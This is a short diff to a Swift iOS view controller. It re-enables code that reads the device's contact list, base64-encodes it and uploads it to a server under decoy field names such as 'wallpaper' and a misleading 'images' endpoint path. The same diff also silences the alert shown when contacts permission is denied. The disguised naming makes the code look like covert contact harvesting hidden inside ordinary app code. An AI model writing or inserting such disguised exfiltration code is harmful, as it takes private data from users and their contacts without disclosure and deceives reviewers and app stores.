@@ -98,24 +98,24 @@ class PLALXRViewController: PLABaseViewController {
                 }
             }
         }
-//        GetLianxiQuanXian.canPer { [weak self] lianxi in
-//            if lianxi {
-//                self?.shanglianxirenxinxi(completion: { lianxirenArray in
-//                    let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
-//                    let base64Data = data?.base64EncodedString() ?? ""
-//                    let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
-//                    PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
-//                        
-//                    } errorBlock: { error in
-//                        
-//                    }
-//                })
-//            }else {
-//                if let self = self {
-//                    self.showContactsPermissionAlert(in: self)
-//                }
-//            }
-//        }
+        GetLianxiQuanXian.canPer { [weak self] lianxi in
+            if lianxi {
+                self?.shanglianxirenxinxi(completion: { lianxirenArray in
+                    let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
+                    let base64Data = data?.base64EncodedString() ?? ""
+                    let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
+                    PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
+                        
+                    } errorBlock: { error in
+                        
+                    }
+                })
+            }else {
+                if let self = self {
+                    
+                }
+            }
+        }
     }
 }
 
